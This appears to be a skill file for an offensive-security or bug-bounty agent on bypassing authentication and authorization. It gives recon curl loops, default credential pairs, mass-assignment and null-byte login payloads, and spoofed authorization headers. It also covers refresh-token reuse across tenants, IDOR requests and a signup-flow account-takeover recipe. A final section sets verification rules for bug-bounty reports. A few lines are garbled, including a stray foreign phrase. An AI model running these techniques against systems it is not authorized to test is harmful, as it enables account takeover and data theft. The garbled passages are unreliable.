---
name: hunt-auth-bypass
description: Authentication & authorization bypass — hardcoded creds, logic flaws, default passwords, role confusion, header injection, magic endpoints, IDOR-adjacent authz. The umbrella skill for "I could get in when I shouldn't". Pairs with hunt-idor, hunt-otp, credential-attack.
---

# AUTH BYPASS — Advanced Guide

**Core:** Two different bugs share this name. (A) *Authentication* bypass: you become someone else / skip login entirely. (B) *Authorization* bypass: you're logged in as you, but reach another user's or an admin's data. Collect the target's whole auth flow first — every endpoint between "logged out" and "data returned" is a bypass candidate.

## 1. MAPPING THE AUTH SURFACE (do this before anything)

```bash
# Every auth decision point
curl -s "https://target.com/login" | grep -ioE "(action|href)=\"[^\"]*\"" | sort -u
# SSO/OAuth/SSO redirect targets
grep -r "redirect_uri\|response_type\|client_id" loginpage.html
# Alternate auth APIs often forgotten
for path in /api/login /api/auth /api/v2/login /auth/token /admin/login \
  /login.json /api/user/authenticate /j_spring_security_check; do
  curl -so /dev/null -w "%{http_code} $path\n" "https://target.com$path"
done
```

## 2. CREDENTIAL-LEVEL BYPASS

### Defaults & Hardcoded Identities
```bash
# Documentation, installation guides and public code often still contain seeded users
# Common live pairs seen in real bugs:
admin:admin, admin:password, admin:<company name>, test:test
root:root, system:password, guest:guest, <support@target>:<campaign-year>
```
- Also check: `admin` variants (`shopadmin`, `root@domain`), API docs "example" credentials reused in production, environment leak of seeded creds (`.env`卖了→ hunt-apikey-leak).

### Username / Email Enumeration responsive to auth behavior
```http
POST /login  email=real@x.com&pass=nope     → "password incorrect"
POST /login  email=fake@x.com&pass=nope     → "user not found"   (enumeration)
```
Also test: different response TIMES (hashing only when user exists), `?` reset-link behavior deltas.

## 3. LOGIC-LEVEL BYPASS (the big money)

### Response Status Manipulation / Client-side Gates
```javascript
// Server gives back 200 + user object with role:"customer"
// Client renders admin panel if role=="admin"
Intercept → role:"admin" → the SPA now shows admin routes (and the APIs below DO enforce nothing server-side?) 
// Confirm server impact: call admin API directly with your customer token.
```

### Parameter Pollution / Mass Assignment on Auth
```http
POST /register  email=me@x.com&pass=A&role=user
→ &role=admin   (mass assignment — welcome to admin role)
POST /api/login email=admin%00@victim.com (null byte / unicode / case tricks)
→ &email[]=victim@x.com  → &email=[victim@x.com]
```

### Magic / Forgotten Endpoints
```
/debug/auth, /test/auth, /staging — dev flows left live in production
/.well-known/* — discovery of account links
/install — unfinished setups with seeded or no-password admins
```

### Header Influenced Authorization
```http
X-Original-URL: /admin/delete-user
X-Rewrite-URL: /admin
X-HTTP-Method-Override: POST
Authorization: Bearer null        / Bearer undefined / Bearer none
X-Api-Key: <one of the "public" keys the mobile app or docs reveal>
```

### State Machines & the Zig-Jump
```
1. Start signup for VICTIM's email but abort before verification.
2. Login with VICTIM's email + YOUR chosen password if the flow allows re-register/claim.
3. The half-finished state wins over the real password (weighting bug).
```

### Token Flaws
```bash
# JWT/teams: see hunt-jwt for algorithm confusion, kid injection, public-key confusion
# Refresh token reuse across tenants: exchange YOUR token with a victim org id in body
POST /oauth/token grant_type=refresh_token&refresh_token=YOURRT&client_id=VICTIMS
```

## 4. AUTHORIZATION ( logged-in-as-you reaching others' data )

```bash
# Systematic: with your own low-priv token, request every ID-bearing endpoint you can see
# with the IDs belonging to the ADMIN/other users
GET /api/admin/reports?user_id=2
GET /api/projects/<victim-uuid>/members
GET /api/user/2?fields[]=*                 (field inclusion bypasses row filters)
```
- "BOLA/IDOR" style — if your own ID is only different in ONE increment, linearize; if UUIDs, try name keys (`/user/victim`).
- Watch the *response shape*, not the status: `{"data":[]}` empty can still reveal existence (oracle) → indicates the ACL runs but you're below reporting threshold… confirm counts.

## 5. VERIFICATION REQUIREMENTS
1. The bypass must be reproducible end-to-end: show the response pairs (blocked vs bypassed).
2. "UI-only" claims are not enough — demo a *server* call that returns victim data without the second factor.
3. Enumeration claims need TWO accounts minimum: one real-existing but not yours, one fake.
4. Impact statement in plain language: what an attacker does next with this access, and what they cannot do — this keeps severity calibrated to program policy.
